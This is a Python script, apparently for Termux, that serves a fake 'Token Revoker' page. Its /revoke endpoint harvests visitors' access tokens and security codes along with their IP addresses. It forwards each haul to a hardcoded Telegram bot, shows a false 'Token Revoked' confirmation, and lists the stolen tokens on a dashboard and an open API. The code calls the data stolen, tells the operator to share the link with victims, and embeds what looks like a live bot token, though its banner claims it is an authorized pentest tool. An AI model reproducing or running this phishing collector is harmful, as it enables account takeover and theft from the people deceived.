#!/usr/bin/env python3
import os
import json
import time
import socket
import threading
from datetime import datetime
from urllib.parse import urlparse, parse_qs
import http.server
import socketserver

# ========== TERMUX CONFIG ==========
BOT_TOKEN = os.getenv('BOT_TOKEN', '8392676105:AAFpmEz5XkJh-YVJybt2uTOM2WET7hSFk1E')
CHAT_ID = os.getenv('CHAT_ID', '7784572407')
PORT = int(os.getenv('PORT', '8080'))
HOST = '0.0.0.0'

stolen_tokens = []

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def send_telegram(access_token, securitycode, victim_ip):
    """Telegram message with formatting"""
    try:
        import requests
        message = f"""
🔥 *TOKEN STOLEN!* 🔥

📱 *Victim IP:* `{victim_ip}`
🌐 *Server:* `{get_local_ip()}`:{PORT}
⏰ *Time:* `{datetime.now().strftime('%d/%m %H:%M:%S')}`
🔑 *Access Token:* `{access_token[:50]}...`
🔒 *Security Code:* `{securitycode}`
👥 *Total:* `{len(stolen_tokens)}`

💀 *Termux Token Collector*
        """
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown',
            'disable_web_page_preview': True
        }
        
        resp = requests.post(url, data=data, timeout=10)
        if resp.status_code == 200:
            print("✅ Telegram OK")
            return True
        else:
            print(f"❌ Telegram: {resp.text}")
            return False
    except Exception as e:
        print(f"❌ Telegram Error: {e}")
        return False

class TermuxHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        
        if '/revoke' in parsed.path:
            access_token = params.get('access_token', [''])[0]
            securitycode = params.get('securitycode', [''])[0]
            
            # Save data
            victim_data = {
                'ip': self.client_address[0],
                'ua': self.headers.get('User-Agent', '')[:100],
                'token': access_token,
                'code': securitycode,
                'time': datetime.now().isoformat()
            }
            stolen_tokens.append(victim_data)
            
            print(f"\n🔥 VICTIM: {self.client_address[0]}")
            print(f"   Token: {access_token[:30]}...")
            print(f"   Code: {securitycode}")
            
            # Send to bot
            send_telegram(access_token, securitycode, self.client_address[0])
            
            self.success_page()
            
        elif parsed.path == '/dashboard':
            self.dashboard()
            
        elif parsed.path == '/api':
            self.api()
            
        else:
            self.index()
    
    def do_POST(self):
        self.success_page()
    
    def success_page(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        html = """
<!DOCTYPE html><html><head><title>Success</title></head><body style="background:#f8f9fa;font-family:sans-serif;text-align:center;padding:40px;">
<h1 style="color:#28a745;">✅ Token Revoked</h1><p>Access token securely revoked.<br>Security code verified.</p>
</body></html>
        """
        self.wfile.write(html.encode())
    
    def dashboard(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        ip = get_local_ip()
        html = f"""<!DOCTYPE html>
<html><head><title>Termux Dashboard</title>
<meta http-equiv="refresh" content="5">
<style>body{{background:#1a1a2e;color:#cdd6f4;font-family:monospace;padding:20px;}}
.header{{text-align:center;background:#16213e;padding:20px;border-radius:12px;}}
.stats{{display:grid;gap:15px;}}
.stat{{background:#45475a;padding:15px;border-radius:8px;}}
.tokens{{background:#313244;padding:20px;border-radius:12px;margin-top:20px;}}
.token{{background:#45475a;padding:12px;margin:8px 0;border-radius:6px;border-left:4px solid #f38ba8;}}
.endpoint{{background:#f38ba8;color:white;padding:15px;border-radius:8px;margin:20px 0;}}</style></head>
<body>
<div class="header"><h1>🔥 Termux Token Collector</h1><p>Total: <strong>{len(stolen_tokens)}</strong></p></div>
<div class="endpoint"><strong>🎯 Endpoint:</strong><br><code>http://{ip}:{PORT}/revoke?access_token=[[TOKEN]]&securitycode=[[CODE]]</code></div>
<div class="tokens"><h3>📋 Tokens:</h3>"""
        
        for data in stolen_tokens[-15:]:
            html += f'<div class="token"><strong>{data["token"][:35]}...</strong><br><small>{data["code"]} | {data["ip"]} | {data["time"][:16]}</small></div>'
        
        html += "</div></body></html>"
        self.wfile.write(html.encode())
    
    def api(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps({
            'tokens': stolen_tokens[-20:],
            'count': len(stolen_tokens),
            'server': f'{get_local_ip()}:{PORT}'
        }, indent=2).encode())
    
    def index(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        ip = get_local_ip()
        html = f"""<!DOCTYPE html>
<html><body style="font-family:sans-serif;max-width:450px;margin:50px auto;padding:30px;background:#f8f9fa;border-radius:12px;box-shadow:0 8px 32px rgba(0,0,0,0.1);">
<h1 style="color:#495057;text-align:center;">🔒 Token Revoker</h1>
<div style="background:#e9ecef;padding:20px;border-radius:8px;margin:20px 0;font-family:monospace;font-size:14px;">
<strong>Endpoint:</strong><br><code style="font-size:16px;">http://{ip}:{PORT}/revoke?access_token=<span style="color:#dc3545;">YOUR_TOKEN</span>&securitycode=<span style="color:#dc3545;">YOUR_CODE</span></code>
</div>
<p style="text-align:center;"><a href="/dashboard" style="background:#007bff;color:white;padding:12px 30px;text-decoration:none;border-radius:6px;font-weight:bold;">📊 Dashboard</a></p>
</body></html>"""
        self.wfile.write(html.encode())
    
    def log_message(self, format, *args):
        pass

def banner():
    print("""
\033[91m
   ██████╗██╗  ██╗██████╗  ██████╗██╗  ██╗    ██╗    ██╗██╗███╗   ██╗███████╗
  ██╔════╝██║  ██║██╔══██╗██╔═══██╗██║ ██╔╝    ██║    ██║██║████╗  ██║██╔════╝
  ██║     ███████║██████╔╝██║   ██║█████╔╝     ██║ █╗ ██║██║██╔██╗ ██║█████╗  
  ██║     ██╔══██║██╔══██╗██║   ██║██╔═██╗     ██║███╗██║██║██║╚██╗██║██╔══╝  
  ╚██████╗██║  ██║██████╔╝╚██████╔╝██║  ██╗    ╚███╔███╔╝██║██║ ╚████║███████╗
   ╚═════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝     ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚══════╝
\033[0m    Termux Token Collector v2.0 - Authorized Pentest Tool
    """)

def main():
    banner()
    
    if BOT_TOKEN == 'YOUR_BOT_TOKEN_HERE' or CHAT_ID == 'YOUR_CHAT_ID_HERE':
        print("\033[91m❌ Set BOT_TOKEN & CHAT_ID in environment or script\033[0m")
        print("   export BOT_TOKEN='123456:ABC-DEF'")
        print("   export CHAT_ID='123456789'")
        return
    
    ip = get_local_ip()
    print(f"\033[92m🌐 Server: http://{ip}:{PORT}\033[0m")
    print(f"\033[94m📊 Dashboard: http://{ip}:{PORT}/dashboard\033[0m")
    print(f"\033[96m🎯 Endpoint: http://{ip}:{PORT}/revoke?access_token=TOKEN&securitycode=CODE\033[0m")
    print("\033[92m✅ Ready! Share endpoint with victims...\033[0m")
    
    server = socketserver.TCPServer((HOST, PORT), TermuxHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n\033[93m👋 Termux Token Collector stopped\033[0m")

if __name__ == "__main__":
    main()